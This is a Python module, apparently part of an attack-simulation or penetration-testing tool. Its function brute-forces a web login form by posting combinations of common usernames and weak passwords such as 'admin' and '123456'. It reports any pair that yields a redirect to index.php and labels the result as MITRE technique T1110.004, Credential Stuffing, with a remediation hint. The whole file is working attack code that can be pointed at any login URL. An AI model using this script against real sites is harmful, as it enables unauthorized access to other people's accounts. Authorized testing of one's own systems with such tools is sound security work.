import requests
from backend.utility_f import log

def run(target_url):
    usernames = ["eve", "alice", "admin", "user"]
    passwords = ["test123", "admin123", "password", "123456", "letmein", "qwerty","1234"]

    for username in usernames:
        for password in passwords:
            try:
                response = requests.post(target_url, data={
                    "username": username,
                    "password": password,
                    "submit": "Login"
                }, allow_redirects=False)

                if response.status_code == 302 and "index.php" in response.headers.get("Location", ""):
                    log(f" Credential reused: {username}:{password}", level="success")
                    return {
                        "stage": "Credential Access",
                        "technique_id": "T1110.004",
                        "technique_name": "Credential Stuffing",
                        "success": True,
                        "details": f"Successfully authenticated with {username}:{password}",
                        "remediation": "Use multi-factor authentication and monitor credential reuse."
                    }

            except Exception as e:
                log(f" Error: {e}", level="error")

    log(" All credential attempts failed.", level="warning")
    return {
        "stage": "Credential Access",
        "technique_id": "T1110.004",
        "technique_name": "Credential Stuffing",
        "success": False,
        "details": "All login combinations failed.",
        "remediation": "Implement rate limiting and credential monitoring."
    }
